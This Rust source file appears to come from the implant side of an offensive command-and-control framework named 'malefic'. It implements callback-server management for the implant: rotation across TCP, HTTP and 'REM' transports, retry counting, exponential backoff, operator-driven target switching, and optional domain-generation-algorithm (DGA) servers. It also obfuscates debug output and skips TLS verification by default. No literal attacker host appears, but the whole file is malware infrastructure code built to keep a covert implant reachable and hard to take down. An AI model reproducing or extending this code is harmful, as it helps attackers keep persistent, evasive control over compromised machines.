use malefic_common::debug;
use malefic_config::{
    HttpRequestConfig, ProtocolType, ProxyConfig, RemConfig, ServerConfig, TcpConfig, TlsConfig,
    TransportConfig,
};
use malefic_gateway::ObfDebug;
use malefic_proto::proto::modulepb;

#[derive(ObfDebug, Clone)]
pub struct Target {
    config: ServerConfig,
    failures: u32,
}

impl Target {
    pub fn new(config: ServerConfig) -> Self {
        Self {
            config,
            failures: 0,
        }
    }

    pub fn from_proto(target: &modulepb::Target) -> Option<Self> {
        if target.address.is_empty() {
            return None;
        }

        let tls_config = Some(match target.tls_config.as_ref() {
            Some(tls) => TlsConfig {
                enable: tls.enable,
                version: tls.version.clone(),
                sni: tls.sni.clone(),
                skip_verification: tls.skip_verify,
                server_ca: Vec::new(),
                mtls_config: None,
            },
            None => TlsConfig {
                enable: false,
                version: String::new(),
                sni: String::new(),
                skip_verification: true,
                server_ca: Vec::new(),
                mtls_config: None,
            },
        });

        let proxy_config = target.proxy_config.as_ref().and_then(|proxy| {
            (!proxy.host.is_empty()).then(|| ProxyConfig {
                proxy_type: proxy.r#type.clone(),
                host: proxy.host.clone(),
                port: proxy.port as u16,
                username: proxy.username.clone(),
                password: proxy.password.clone(),
            })
        });

        let domain_suffix =
            (!target.domain_suffix.is_empty()).then(|| target.domain_suffix.clone());
        let protocol_name = target.protocol.trim().to_ascii_lowercase();

        match protocol_name.as_str() {
            "" | "tcp" => {
                let transport_config = TransportConfig::Tcp(TcpConfig {});
                Some(Self::new(ServerConfig {
                    address: target.address.clone(),
                    protocol: ProtocolType::Tcp,
                    session_config: malefic_config::SessionConfig::default_for_transport(
                        &transport_config,
                        *malefic_config::KEEPALIVE,
                    ),
                    transport_config,
                    tls_config,
                    proxy_config,
                    domain_suffix,
                }))
            }
            "http" => {
                let http_config = target
                    .http_config
                    .as_ref()
                    .map(|http| {
                        let mut config = HttpRequestConfig::new(
                            &non_empty_or(&http.method, "POST"),
                            &non_empty_or(&http.path, "/"),
                            &non_empty_or(&http.version, "1.1"),
                        );
                        config.headers = http.headers.clone();
                        config
                    })
                    .unwrap_or_else(|| HttpRequestConfig::new("POST", "/", "1.1"));
                let transport_config = TransportConfig::Http(http_config);

                Some(Self::new(ServerConfig {
                    address: target.address.clone(),
                    protocol: ProtocolType::Http,
                    session_config: malefic_config::SessionConfig::default_for_transport(
                        &transport_config,
                        *malefic_config::KEEPALIVE,
                    ),
                    transport_config,
                    tls_config,
                    proxy_config,
                    domain_suffix,
                }))
            }
            "rem" => {
                let link = target
                    .rem_config
                    .as_ref()
                    .map(|r| r.link.clone())
                    .unwrap_or_default();
                let transport_config = TransportConfig::Rem(RemConfig::new(link));

                Some(Self::new(ServerConfig {
                    address: target.address.clone(),
                    protocol: ProtocolType::REM,
                    session_config: malefic_config::SessionConfig::default_for_transport(
                        &transport_config,
                        *malefic_config::KEEPALIVE,
                    ),
                    transport_config,
                    tls_config,
                    proxy_config,
                    domain_suffix,
                }))
            }
            other => {
                debug!("[target] Ignoring unsupported target protocol: {}", other);
                None
            }
        }
    }

    pub fn server_config(&self) -> &ServerConfig {
        &self.config
    }

    pub fn address(&self) -> &str {
        &self.config.address
    }
}

#[derive(ObfDebug)]
pub struct ServerManager {
    targets: Vec<Target>,
    current: usize,
    per_target_failures: u32,
    max_cycles: i32,
    cycles: u32,
    #[cfg(feature = "dga")]
    dga_generator: Option<malefic_dga::DgaGenerator>,
}

/// Return `s` as owned String if non-empty, otherwise `default`.
fn non_empty_or(s: &str, default: &str) -> String {
    if s.is_empty() {
        default.to_string()
    } else {
        s.to_string()
    }
}

fn same_target(lhs: &Target, rhs: &Target) -> bool {
    lhs.server_config() == rhs.server_config()
}

fn deduplicate_targets(targets: impl IntoIterator<Item = Target>) -> Vec<Target> {
    let mut unique = Vec::new();
    for target in targets {
        if unique.iter().any(|existing| same_target(existing, &target)) {
            continue;
        }
        unique.push(target);
    }
    unique
}

fn make_targets(configs: Vec<ServerConfig>) -> Vec<Target> {
    deduplicate_targets(configs.into_iter().map(Target::new))
}

impl ServerManager {
    pub fn new(configs: Vec<ServerConfig>) -> Self {
        use malefic_config::{MAX_CYCLES, RETRY};

        let per_target_failures = *RETRY;
        let max_cycles = *MAX_CYCLES;

        #[cfg(feature = "dga")]
        let dga_generator = {
            use malefic_config::DGA_ENABLE;
            if *DGA_ENABLE {
                let dga_configs: Vec<ServerConfig> = configs
                    .iter()
                    .filter(|c| c.supports_dga())
                    .cloned()
                    .collect();

                if !dga_configs.is_empty() {
                    match malefic_dga::DgaGenerator::from_server_configs(dga_configs) {
                        Ok(gen) => Some(gen),
                        Err(_e) => {
                            debug!("[target] Failed to create DGA generator: {:?}", _e);
                            None
                        }
                    }
                } else {
                    None
                }
            } else {
                None
            }
        };

        Self {
            targets: make_targets(configs),
            current: 0,
            per_target_failures,
            max_cycles,
            cycles: 0,
            #[cfg(feature = "dga")]
            dga_generator,
        }
    }

    pub fn current(&self) -> Option<&Target> {
        self.targets.get(self.current)
    }

    pub fn mark_success(&mut self) {
        if let Some(target) = self.targets.get_mut(self.current) {
            target.failures = 0;
            debug!("[target] {} success", target.address());
        }
        self.cycles = 0;
    }

    /// Returns backoff duration in seconds based on completed cycles.
    /// cycle 0: no backoff, cycle 1: 300s, cycle 2: 600s, ..., capped at 12 hours.
    pub fn backoff_secs(&self) -> Option<u64> {
        if self.cycles == 0 {
            return None;
        }
        const BASE_SECS: u64 = 300;
        const MAX_SECS: u64 = 43200;
        let shift = (self.cycles - 1).min(31);
        let secs = BASE_SECS.saturating_mul(1u64 << shift);
        Some(secs.min(MAX_SECS))
    }

    pub fn mark_failure(&mut self) -> bool {
        if let Some(target) = self.targets.get_mut(self.current) {
            target.failures += 1;
            debug!(
                "[target] {} failure {}/{}",
                target.address(),
                target.failures,
                self.per_target_failures
            );
            if target.failures >= self.per_target_failures {
                return self.next();
            }
        }
        true
    }

    /// Replace the entire target list (for switch REPLACE action).
    /// Resets rotation state and rebuilds DGA generator if applicable.
    /// Does nothing if configs is empty.
    pub fn replace_targets(&mut self, configs: Vec<ServerConfig>) {
        let targets = make_targets(configs.clone());
        if targets.is_empty() {
            return;
        }

        #[cfg(feature = "dga")]
        {
            use malefic_config::DGA_ENABLE;
            if *DGA_ENABLE {
                let dga_configs: Vec<ServerConfig> = configs
                    .iter()
                    .filter(|c| c.supports_dga())
                    .cloned()
                    .collect();

                self.dga_generator = if !dga_configs.is_empty() {
                    match malefic_dga::DgaGenerator::from_server_configs(dga_configs) {
                        Ok(gen) => Some(gen),
                        Err(_e) => {
                            debug!("[target] Failed to recreate DGA generator: {:?}", _e);
                            None
                        }
                    }
                } else {
                    None
                };
            }
        }

        self.targets = targets;
        self.current = 0;
        self.cycles = 0;
    }

    pub fn replace_target_entries(&mut self, targets: Vec<Target>) {
        let targets = deduplicate_targets(targets);
        if targets.is_empty() {
            return;
        }

        #[cfg(feature = "dga")]
        {
            use malefic_config::DGA_ENABLE;
            if *DGA_ENABLE {
                let dga_configs: Vec<ServerConfig> = targets
                    .iter()
                    .map(|target| target.server_config().clone())
                    .filter(|config| config.supports_dga())
                    .collect();

                self.dga_generator = if !dga_configs.is_empty() {
                    match malefic_dga::DgaGenerator::from_server_configs(dga_configs) {
                        Ok(gen) => Some(gen),
                        Err(_e) => {
                            debug!("[target] Failed to recreate DGA generator: {:?}", _e);
                            None
                        }
                    }
                } else {
                    None
                };
            }
        }

        self.targets = targets;
        self.current = 0;
        self.cycles = 0;
    }

    /// Append targets to the existing list (for switch ADD action).
    /// Deduplicates by full target config. Does not change current pointer.
    pub fn add_targets(&mut self, configs: Vec<ServerConfig>) {
        self.add_target_entries(make_targets(configs));
    }

    pub fn add_target_entries(&mut self, targets: Vec<Target>) {
        for target in deduplicate_targets(targets) {
            if self
                .targets
                .iter()
                .any(|existing| same_target(existing, &target))
            {
                continue;
            }
            debug!("[target] Added target: {}", target.address());
            self.targets.push(target);
        }
    }

    /// Switch the current active target to the given config.
    /// If the same full target config exists in the list, moves current pointer to it.
    /// If not, appends it and sets it as current.
    pub fn switch_to(&mut self, config: ServerConfig) {
        self.switch_to_target(Target::new(config));
    }

    pub fn switch_to_target(&mut self, target: Target) {
        if let Some(idx) = self
            .targets
            .iter()
            .position(|existing| same_target(existing, &target))
        {
            self.current = idx;
            self.targets[idx].failures = 0;
            debug!(
                "[target] Switched to existing target: {}",
                self.targets[idx].address()
            );
        } else {
            debug!("[target] Switched to new target: {}", target.address());
            self.targets.push(target);
            self.current = self.targets.len() - 1;
        }
    }

    pub fn new_with_params(configs: Vec<ServerConfig>, retry: u32, max_cycles: i32) -> Self {
        Self {
            targets: make_targets(configs),
            current: 0,
            per_target_failures: retry,
            max_cycles,
            cycles: 0,
            #[cfg(feature = "dga")]
            dga_generator: None,
        }
    }

    fn next(&mut self) -> bool {
        let total = self.targets.len();
        if total == 0 {
            return false;
        }

        let next_index = (self.current + 1) % total;

        if next_index <= self.current {
            self.cycles += 1;
            debug!(
                "[target] Completed cycle {}/{}",
                self.cycles,
                if self.max_cycles == -1 {
                    "∞".to_string()
                } else {
                    self.max_cycles.to_string()
                }
            );

            if self.max_cycles >= 0 && self.cycles >= self.max_cycles as u32 {
                debug!("[target] Max cycles reached, stopping");
                return false;
            }

            #[cfg(feature = "dga")]
            if let Some(ref generator) = self.dga_generator {
                for config in generator.generate_new_server() {
                    let target = Target::new(config);
                    if self
                        .targets
                        .iter()
                        .any(|existing| same_target(existing, &target))
                    {
                        continue;
                    }
                    debug!("[target] Added DGA target: {}", target.address());
                    self.targets.push(target);
                }
            }

            for target in &mut self.targets {
                target.failures = 0;
            }
        }

        self.current = next_index;
        debug!(
            "[target] Switched to {}",
            self.targets
                .get(self.current)
                .map(|target| target.address())
                .unwrap_or("unknown")
        );
        true
    }

    pub fn targets_from_proto(targets: &[modulepb::Target]) -> Vec<Target> {
        deduplicate_targets(targets.iter().filter_map(Target::from_proto))
    }

    /// Convert proto `Target` messages to `ServerConfig` for transport-independent callers.
    pub fn targets_to_server_configs(targets: &[modulepb::Target]) -> Vec<ServerConfig> {
        Self::targets_from_proto(targets)
            .into_iter()
            .map(|target| target.config)
            .collect()
    }
}
